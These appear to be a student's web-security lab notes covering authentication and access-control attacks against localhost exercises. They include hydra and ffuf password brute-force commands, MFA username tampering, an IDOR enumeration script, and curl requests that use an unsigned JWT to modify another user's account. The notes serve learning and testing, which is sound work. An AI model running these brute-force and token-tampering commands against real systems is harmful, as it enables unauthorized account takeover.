

Authentication : Who we are, our identity eg : Aadhar card

Authorization (Access Control) : What we are allowed to do


---


### Brute-Force Attacks


1) hydra

```sh
hydra -l jeremy -P /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000.txt   127.0.0.1 http-post-form "/a0x01.php:username=^USER^&password=^PASS^:Your username"
```


2) Intruder


3) ffuf

```sh
ffuf -request req.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000.txt:FUZZPASS 
```


---


### Attacking MFA


Login with given creds
We get MFA code

![[MFA.png]]


We cannot edit the username here so

Intercept the request, change the username to target username and forward the request

We get login to target user's account

1) Check if token Applies to multiple users, in this case it does
2) If token has very less digits, try to brute force it

---

### Challenge

Dont knwo both username and password

We use clusterbomb mode here

It is like cartesian product(all permutations tested)

```sh
ffuf -r -c -ic -request lab3req.txt -request-proto http -mode clusterbomb -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000.txt:FUZZPASS -w /usr/share/wordlists/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt:FUZZUSER
```



---

### Authorization


Access Control : What we are allowed to do

1) Vertical Access Control : Restrict access to specific functionalities to specific users.

Example : In a web commerce app, vertical access control will prevent a customer to access admin panel to edit a product

2) Horizontal Access Control : These restrict access to specific resources for a specific user.

Example : User maybe able to view and update their own account, but they would not be able to view and update other peoples account.


3) Context Dependent Access Control : Allow or restrict Access based on the applications current state.

Example : Application may not allow us to checkout if there is nothing in our cart


***When a user is able to access functionalities, we have broken access control***


---


### IDOR(Insecure Direct Object Refrence)


```sh
ffuf -r -c -ic -w num.txt -u "http://localhost/labs/e0x02.php?account=FUZZ"
```

When adding FUZZ to a parameter, put the url inside quotes

We get lots of accounts, some of type=user and some of type=admin

Clearly broken access control

If we want to find only admin accounts, we can write a script for it

```sh
#!/bin/bash
# Declare an array named "fuzz"
fuzz=()
# Read numbers from the file "num.txt" into the array "fuzz"
readarray -t fuzz < num.txt
# Iterate over each element in the "fuzz" array
for i in "${fuzz[@]}"
do
# Construct a URL using the current element 
# Send a request to the URL using curl, suppress output (-s) # Check if the output contains the string "admin" using grep 
# If "admin" is found, print the current element
curl -s http://localhost/labs/e0x02.php?account=${i} | grep admin && echo $i

done

```



If this issue appears in API, we call it BOLA(Broken Object Level Authorization)



---


### API (Application Programming Interface)

I***f web page fetches some data and instead of entire page being updated, only certain part does, there is a high chance that API is being used.
API request is to some endpoint that returns some data and that data is processed at the client side and Javascript handles that data and presents it in suitable format***

GET requests fetch information
POST requests create information

---

### Broken Access Control


We are allowed to make few diffrent types of API calls


![[API.png]]


```sh
curl -X POST -H "Content-Type: application/json" -d '{"username": "jeremy", "password": "cheesecake"}' http://localhost/labs/api/login.php
```

Response : {"status":"success","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=."} 

JWT made of 3 parts

1) Header
2) Payload : Contains the claims
3) Signature : To verify integrity(Check if JWT has been tampered with or not)

***Each part of JWT is base64 encoded"

These 3 parts are separated by a '.' . In the response we can see that there are only 2 parts, so the signature is missing, means we can tamper with the JWT


We can inspect JWT at \https://jwt.io

```sh
echo "eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=" | base64 -d
```


Response : {"user":"jeremy","role":"staff"}

```sh
curl -X GET "http://localhost/labs/api/account.php?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=."
```


Response : {"username":"jeremy","role":"staff","bio":"Java programmer."}

```sh
curl -X POST -H "Content-Type: application/json" -d '{"username": "jessamy", "password": "tiramisu"}' http://localhost/labs/api/login.php
```

Response : {"status":"success","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9."}

Since signature not being verfied, we can use Jeremy's JWT to update Jessamy's account info

```sh
curl -X PUT -H "Content-Type: application/json" -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=.", "username":"jessamy", "bio": "Update done by Jeremy"}' http://localhost/labs/api/account.php
```

Response : {"status":"success","message":"Bio updated successfully"}

Now try to access Jessamy's account info

```sh
curl -X GET "http://localhost/labs/api/account.php?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9."
```

Response : {"username":"jessamy","role":"admin","bio":"Update done by Jeremy"} 

***This attack in API is called Broken Function Level Authorization(BFLA)***


---


### Testing With Autorize


Extension Settings : Put the Jython standalone file location to download autorize

Jeremy's JWT : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=.

Jessamy's JWT : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9.


Add Jessamy's JWT, switch Autorize on

Instead of passing JWT in the body, pass it as a cookie


```sh
curl -X PUT -H "Content-Type: application/json" --proxy localhost:8080 -b "session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=." -d '{"username":"jeremy", "bio": "New bio v2"}' http://localhost/labs/api/v2/account.php

```

Response : {"status":"success","message":"Bio updated successfully"}

-b : for cookie
--proxy : So the request goes through burp suite and we can check in Autorize if the request Uthorize status was bypassed or not

![[Autorize.png]]


If request Authorized status = enforced, then the attack failed